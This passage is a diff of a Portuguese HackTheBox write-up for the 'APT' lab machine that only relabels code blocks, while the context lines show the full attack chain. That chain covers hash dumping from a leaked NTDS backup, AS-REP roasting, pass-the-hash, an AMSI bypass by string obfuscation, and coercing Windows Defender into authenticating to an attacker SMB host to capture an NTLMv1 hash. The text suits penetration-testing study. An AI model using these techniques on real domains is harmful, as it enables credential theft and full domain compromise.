@@ -62,7 +62,7 @@ Esta máquina tem apenas 2 portas abertas! E para não engonhar, para não ter u
 
 O servidor web tem paginas de internet mas não se consegue entrar por ai... Apenas há uma informação de relevo, mas que nem sequer é preciso entrar pelo browser para ver isso
 
-```bash
+```powershell
 whatweb http://10.10.10.213/ | sed 's/, /\n/g'
 
 #>  http://10.10.10.213/ [200 OK] Bootstrap
@@ -83,7 +83,7 @@ O email pode ajudar mais tarde (sales@gigantichosting.com)...
 
 Já que o servidor Web não nos dá acesso à máquina, só ja temos mais este ponto...
 
-```bash
+```powershell
 rcpclient 10.10.10.213
 rcpclient 10.10.10.213 -N-U 'null' -N
 rcpclient 10.10.10.213 -U 'guest' -N
@@ -110,7 +110,7 @@ Para conseguir saber o IPv6, por RPC, basta usar esta ferramenta
 
 > https://github.com/mubix/IOXIDResolver
 
-```bash
+```powershell
 git clone https://github.com/mubix/IOXIDResolver
 cd IOXIDResolver
 
@@ -128,7 +128,7 @@ O ping mostra que a máquina responde. A partir de agora, vamos começar novamen
 
 ## Nmap
 
-```bash
+```powershell
 nmap -p- --open -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG enumeration/allPorts-IPv6 -vvv --min-rate 5000
 
 extractPorts enumeration/allPorts-IPv6
@@ -168,7 +168,7 @@ Agora sim! Temos informações. Parece ser um AD/DC (Active Directory / Domain C
 
 Com essas informações, e para termos menos problemas com as diversas ferramentas por causa do IPv6, vamos colocar essas informações no /etc/hosts.
 
-```bash
+```powershell
 echo -e "dead:beef::b885:d62a:d679:573f\tapt apt.htb.local htb.local" >> /etc/hosts
 ```
 
@@ -176,7 +176,7 @@ echo -e "dead:beef::b885:d62a:d679:573f\tapt apt.htb.local htb.local" >> /etc/ho
 
 Seguindo os passos habituais, que no meu caso é tentar obter credenciais via RPC com **"enumdomusers"**, para depois tentar um AS-REP Roasting Attack, ou até mesmo tentar esse mesmo ataque à bruta com **"kerbrute"**, não obtemos resultados conclusivos. O serviço rpc não está disponível para usuários não autenticados. E o kerbrute às escuras não encontra nada. Passamos para o serviço Samba.
 
-```bash
+```powershell
 crackmapexec smb apt
 #>  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 
@@ -198,7 +198,7 @@ crackmapexec smb apt --shares -u '' -p ''
 
 Até que enfim vemos algo da máquina! Uma pasta partilhada de backup... Promissor...
 
-```bash
+```powershell
 smbclient \\\\apt\\backup -U '' -N
 smb: \> dir
 
@@ -213,7 +213,7 @@ unzip backup.zip
 
 O ficheiro está protegido por palavra passe... Podemos tentar romper a palavra passe por força bruta com o dicionário **_rockyou.txt_** da seguinte forma:
 
-```bash
+```powershell
 zip2johh backup.zip > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 john hash --show
@@ -225,20 +225,20 @@ unzip backup.zip  # iloveyousomuch
 
 O conteúdo do ficheiro zip é espetacular! Tem um ficheiro SYSTEM e um ficheiro ntds.nit. Com esses dois ficheiros é possível extrair todos os hashes de um Domain Controller.
 
-```bash
+```powershell
 secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > contents/secretsdump.out
 ```
 
 O output é enorme. Deve ser a simulação da GOOGLECORP ou coisa parecida LOOOL... 8005 linhas!!
 
-```bash
+```powershell
 cat secretsdump.out | grep aad | awk -F ':' '{print$1}' > users
 cat secretsdump.out | grep aad | awk -F ':' '{print$4}' > hashes
 ```
 
 Temos agora dois ficheiros, um de users, e um de hashes. Vamos primeiro enumerar os users... Para isso, nada melhor que o kerberos para enumerar os users existentes. Vamos tentar efetuar um AS-REP Roasting Attack. Se o user existe, a resposta vai ser que o usuário não tem pre autenticação ativada, e se tivermos um hash kerberos, bem podemos tentar crackeá-lo...
 
-```bash
+```powershell
 GetNPUsers.py htb.local/ -no-pass -usersfile users | grep -v "not found"
 #>  [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
 #>  [-] User APT$ doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -247,7 +247,7 @@ GetNPUsers.py htb.local/ -no-pass -usersfile users | grep -v "not found"
 
 Temos 3 usuários válidos. Mas não conseguimos obter nenhum TGT. A lista de Hashes que temos poderá ter (e confirmo já que tem lol) um hash válido para 1 dos usuários. Pode estar a simular um usuário que mudou de nome mas não mudou de password. Isto pode ter facilmente verificado através de crackmapexec
 
-```bash
+```powershell
 crackmapexec smb apt -u valide_users -H hashes
 ```
 
@@ -259,7 +259,7 @@ Posto isso, podemos tentar receber um TGT com username e um HASH (ou uma passwor
 
 Existe uma outra utilidade do Impacket que se chama **getTGT.py** e que faz este serviço. O problema é que faz apenas e só uma petição. Não dá para fazer por força bruta com recurso a dicionário. Bem, isto resolve-se com bash, um **for loop** e paralelizar as petições. Depois ainda há outro problema. No output, não temos informações do nome ou do hash que está a ser usado. Para contornar isso, decidi enviar cada output em separado, e cujo o nome do ficheiro é simplesmente o hash... O output correcto informa que foi criado um ficheiro qualquer com o formato "username.ccache". Depois com um find e um grep, é fácil recuperar o hash e o seu username...
 
-```bash
+```powershell
 getTGT.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe htb.local/henry.vinson
 
 #>  Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
@@ -292,7 +292,7 @@ o reg.py, é outro recurso do Impacket, que simula uma petição do reg.exe com 
 
 Vamos validar com crackmapexec...
 
-```bash
+```powershell
 crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
 #>  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 #>  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht
@@ -310,7 +310,7 @@ Vou usar a ferramenta winPEAS64.exe para enumerar a máquina mais rápidamente
 
 ## winPEAS64.exe
 
-```bash
+```powershell
 # kali
 wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
 
@@ -336,7 +336,7 @@ AMSI é tipo uma API que todos os programas podem usar para analisar sequências
 
 O Mimikatz é extremamente conhecido no mundo do Pentesting... E Windows Também o conhece. Existe uns scripts pelo github com o nome Invoke-Mimikatz.ps1, e que faz muitas coisinhas más ao Windows... Antes mesmo de executar o commando, o powershell envia a string para o AMSI analisar, e como Invoke-Mimikatz.ps1 é muitas vezes utilizada por black-hackers, o AMSI informa do potencial perigo e impede a sua execução. Uma das técnicas de bypass é a ofuscação:
 
-```bash
+```powershell
 "Invo" + "ke-Mimi" + "katz"
 #>  Invoke-Mimikatz
 ```
@@ -355,7 +355,7 @@ Agora que temos mais liberdade no powershelll, ainda falta bypassear o Windows D
 
 Avançando! Com o evil-winrm, basta indicar que queremos usar essa função, passar o programa e o seus argumentos
 
-```bash
+```powershell
 # Target Machine
 Invoke-Binary /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe -h
 Invoke-Binary /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe log=C:\Users\henry.vinson_adm\Documents\winPEAS.out
@@ -375,7 +375,7 @@ O **responder** permite fazer isso facilmente, mas temos de o preparar para que,
 
 Temos de configurar o nosso responder.py para especificar o nosso salt:
 
-```bash
+```powershell
 which responder
 locate responder.conf
 cat /var/lib/dpkg/info/responder.conffiles
@@ -387,7 +387,7 @@ sudo nano /etc/responder/Responder.conf
 
 Depois de forçar o SALT a 1122334455667788 para ser enviado quando nos for solicitado durante o Challenge Responde Protocol, é só ligar o responder e esperar...
 
-```bash
+```powershell
 sudo responder -I tun0 --lm -v
 ```
 
@@ -399,7 +399,7 @@ Pois não. Ninguém vai porque é uma máquina HTB, mas mesmo assim, podemos for
 
 Mas já temos tudo o que percisamos deste usuário, portanto nem vale a pena enviar petições ao nosso responder... Mas podemos fazer com que outro usuário faça uma petição... À pouco, percisámos burlar o Windows Defender... e agora, vamos percisar dele lool. Podemos dizer ao Windows Defender para verificar a perigosidade de um arquivo noutro ponto de rede. E o usuários que irá fazer isso é um administrador...
 
-```bash
+```powershell
 cd "C:\Program Files\Windows Defender"
 .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.21\test.txt
 ```
@@ -418,7 +418,7 @@ Já temos o hash NTLMv1 em claro:
 
 > APT$:d167c3238864b12f5f82feae86a7f798
 
-```bash
+```powershell
 crackmapexec smb apt -u 'APT$' -H 'd167c3238864b12f5f82feae86a7f798'
 
 #>  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
@@ -439,7 +439,7 @@ Temos um shell com privilégio total sobre o Domain Controller...
 
 Agora é só copiar as flags no HTB e está feito!!
 
-```bash
+```powershell
 cd C:\
 cmd /c 'dir /r /s root.txt user.txt 2>NUL'
 
